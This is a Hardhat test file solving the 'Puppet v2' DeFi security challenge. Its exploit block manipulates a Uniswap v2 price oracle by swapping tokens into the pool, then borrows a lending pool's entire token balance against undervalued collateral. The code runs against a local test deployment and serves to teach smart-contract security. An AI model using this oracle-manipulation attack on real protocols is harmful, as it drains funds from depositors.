const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        console.log(" ");

        // Estimating the initial amount of collateral needed to borrow.
        let oneDVT = ethers.utils.parseEther("1");
        let collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);

        // We need to drain the WETH or increase the DVT on the UniswapV2 pool in order to get DVT >>>> WETH.
        let amountToLiquidate = ethers.utils.parseEther("10000");
        let askedAmountOfETH = ethers.utils.parseEther("8");
        let txPath = [this.token.address, this.weth.address];

        await this.token.connect(attacker).approve(this.uniswapRouter.address, amountToLiquidate);
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            amountToLiquidate,                                           // amountOut
            askedAmountOfETH,                                          // amountInMax
            txPath,                                                     // path
            attacker.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline
        );
        console.log(`Swapped ${ethers.utils.formatEther(amountToLiquidate)} DVT for ${ethers.utils.formatEther(askedAmountOfETH)}`)
        
        let attackerEthBalance = await ethers.provider.getBalance(attacker.address);
        let attackerDVTBalance = await this.token.balanceOf(attacker.address);

        let uniswapEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
        let uniswapDVTBalance = await this.token.balanceOf(this.uniswapExchange.address);

        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Attacker Balances:`);
        console.log(`${ethers.utils.formatEther(attackerEthBalance)} ETH`);
        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Uniswap Balances:`);
        console.log(`${ethers.utils.formatEther(uniswapEthBalance)} ETH`);
        console.log(`${ethers.utils.formatEther(uniswapDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");
        
        // Swapping the new ether amount for WETH (minus a small amount to cover gas costs).
        this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).mul(997).div(1000)});
        let attackerWethBalance = await this.weth.balanceOf(attacker.address);
        console.log(`The attacker now has ${ethers.utils.formatEther(attackerWethBalance)} WETH`);

        // Calculating the collateral for the new token status.
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
        
        let currentPoolBalance = await this.token.balanceOf(this.lendingPool.address);
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(currentPoolBalance);
        console.log(`If we get greedy, to drain the pool we need ${ethers.utils.formatEther(collateralRequired)} WETH`);
        console.log(" ");

        // Now, we can drain the pool
        let amountToBorrow = await this.token.balanceOf(this.lendingPool.address);
        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
        console.log(`In order to borrow ${ethers.utils.formatEther(amountToBorrow)} DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
        await this.weth.connect(attacker).approve(this.lendingPool.address, amountToBorrow.mul(101).div(100)); // Allowing 1% more as a sec. coef.
        await this.lendingPool.connect(attacker).borrow(amountToBorrow);

        attackerWethBalance = await this.weth.balanceOf(attacker.address);
        attackerDVTBalance = await this.token.balanceOf(attacker.address);

        console.log(" ");
        console.log("========== ========== ==========");
        console.log(`Attacker Balances:`);
        console.log(`${ethers.utils.formatEther(attackerWethBalance)} WETH`);
        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
        console.log("========== ========== ==========")
        console.log(" ");        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});